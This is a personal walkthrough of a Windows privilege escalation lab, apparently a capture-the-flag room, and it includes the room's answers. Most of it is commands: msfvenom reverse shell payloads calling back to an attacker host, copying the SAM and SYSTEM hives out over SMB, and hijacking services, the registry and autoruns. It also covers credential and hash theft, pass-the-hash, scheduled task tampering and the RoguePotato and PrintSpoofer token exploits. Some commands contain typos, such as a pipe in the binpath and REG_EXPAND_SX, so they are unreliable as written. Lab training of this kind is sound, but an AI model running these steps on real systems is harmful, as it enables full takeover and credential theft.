# Windows PrivEsc

### Task 2

On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ip_address] -f exe -o reverse.exe

Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many way you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file. 

On Kali, in the same directory as reverse.exe:

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . 

On Windows:

copy \\[ip_address]\kali\reverse.exe C:\PrivEsc/reverse.exe

Test the reverse shell by setting up a netcat listener on Kali:

sudo nc -nvlp 53

The run the reverse.exe executable on Windows and catch the shell.

### Task 3 - Insecure Service Permissions

Use accesschk.exe to check the "user” account's permissions on the "daclsvc” service:

C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc

Note that the "user” account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):

sc qc daclsvc

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

sc config daclsvc binpath= "\”C:\PrivEsc|reverse.exe\""

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start daclsvc

*What is the original BINARY_PATH_NAME of the daclsvc service?*

Ans: C:\Program Files\DACL Service\daclservice.exe

### Task 4 - Unquoted Service Path

Query the "unquotedsvc” service and note that it runs with SYSTEM privileges (SYSTEM_START_ NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.

sc qc unquotedsvc

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:

C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\unquoted Path Service\”

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe”

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start unquotedsvc

*What is the BINARY_PATH_NAME of the unquotedsvc service?*

Ans: C:\Program Files\unquoted Path Service\Common Files\unquotedpathservice.exe

### Task 5 - Service Exploits - Weak Registry Permissions

 Query the "regsvc” service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

sc qc regsvc

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE” group (essentially all logged-on users):

C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

reg add HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SX /d C:\PrivEsc\reverse.exe /f

Start a listener

net start regsvc

### Task 6 - Service Exploits - Insecure Service Executables

Query the "filepermsvc” service, rest is same as above.

same

Using accesschk.exe, note that the binary file is writable by everyone.

same until: "C:\Program Files\File Permissions Service\filepermservice.exe” /Y

Copy the reverse.exe

same as above, just change location with that of the filepermsvc.

Start a listener

same 

### Task 7 - AutoRuns

Query the registry for AutoRun executables:

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe”

Copy the reverse.exe you created and overwrite the AutoRun executable with it:

same as above

Start a listener on Kali and then restart the Windows VM. open up a new RDP seesion to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would ahve to wait for an administrator to log in themselves!

rdesktop 10.80.157.241

### Task 8 - Registry - AlwaysInstallElevated

Query the registry for AlwaysInstallElevated keys:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ip_address] LPORT=53 -f msi -o reverse.msi

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

Start a listener on Kali and then run the installer to trigger a reverse shell running SYSTEM privileges:

msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

### Task 9 - Passwords - Registry

The registry can be searched for keys and values that contain the word "password”:

reg query HKLM /f password /t REG_SZ /s

If you want to save some time, query this specific key to find admin AutoLogon credentials:

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon”

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

winexe -U 'admin%password’ //[ip_address] cmd.exe

*What was the amdin password you found in the registry?*

Ans: password123

### Task 10 - Passwords - Saved Creds

List any saved credentials:

cmdkey /list

Note that credentials for the "admin” user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

runas /savecred /user:admin C:\PrivEsc\reverse.exe

### Task 11 - Passwords - Security Account Manager (SAM)

The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory. 

Transfer the SAM and SYSTEM files to your Kali VM:

copy C:\Windows\Repair\SAM \\10.10.10.10\kali\

copy C:\Windows\Repair\SYSTEM  \\10.10.10.10\kali\

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes fro the SAM and SYSTEM files:

git clone https://github.com/Tib3rius/creddump7

pip3 install pycrypto

python3 creddump7/pwdump.py SYSTEM SAM

Crack the admin NTLM hash using hashcat:

hashcat -m 1000 —force <hash> /usr/share/wordlists/rockyou.txt

You can use the cracked password to log in as the admin using winexe or RDP. 

*What is the NTLM hash of the admin user?*

Ans: -

### Task 12 - Passwords - Passing the Hash

Why crack a password hash when you can authenticate using the hash?

Use the full admin hash with pth-winexe to spawn a shell running a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:

pth-winexe -U 'admin%hash’ //10.82.155.81 cmd.exe

### Task 13 - Scheduled Tasks

View the contents of the C:\DevTools\CleanUp.ps1 script:

type C:\DevTools\CleanUp.ps1

The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:

accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:

echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM. 

### Task 14 - Insecure GUI Apps

Start and RDP session as the "user” account:

rdesktop -u user -p password321 MACHINE_IP

Double-click the "AdminPaint” shortcut on your Desktop. Once it is running, open a command prompt adn note that Paint is running with admin privileges:

tasklist /V | findstr mspaint.exe

In Paint, click "File” and the "Open”. In the open dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe

Press Enter to spawn a command prompt running with admin privileges.

 

### Task 15 - Startup Apps

Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:

accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp”

Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut you your reverse.exe executable in the StartUp directory:

cscript C:\privEsc\CreateShortcut.vbs

Start a listener on Kali, and then simualte an admin logon using RDP and the credentials you previously extracted:

rdesktop -u admin 10.82.172.2

A shell running as admin should connect back to your listener. 

### Task 16 - Token Impersonation - Rogue Potato

Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:

sudo socat tcp-listen:135,reuseaddr, fork tcp:10.82.172.2:9999

Start a listener on Kali. Simulate getting a service account shell by loggin into RDP as the admin user, starting an elevated command prompt (right-click → run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service” account:

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service” C:\privEsc\reverse.exe

Start another listener on Kali.

Now, in the "local service” reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges:

C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe” -l 9999

*Name one user privilege that allows this exploit to work.*

Ans: SeImpersonatePrivilege

*Name the other user privilege that allows this exploit to work.*

Ans: SeAssignPrimaryTokenPrivilege

### Task 17 - Token Impersonation - PrintSpoofer

Start a listener on Kali. Simulate getting a service account shell by loggin into RDP as the admin user, starting an elevated command prompt adn using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service” account:

same as above

C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe” -i

### Task 18 - Privilege Escalation Scripts

Several tools have been written which help find potential escalations on Windows. Four of these tools have been included on the Windows Vm in the C:\PrivEsc directory:

winPEASany.exe

Seatbelt.exe

PowerUp.ps1

SharpUp.exe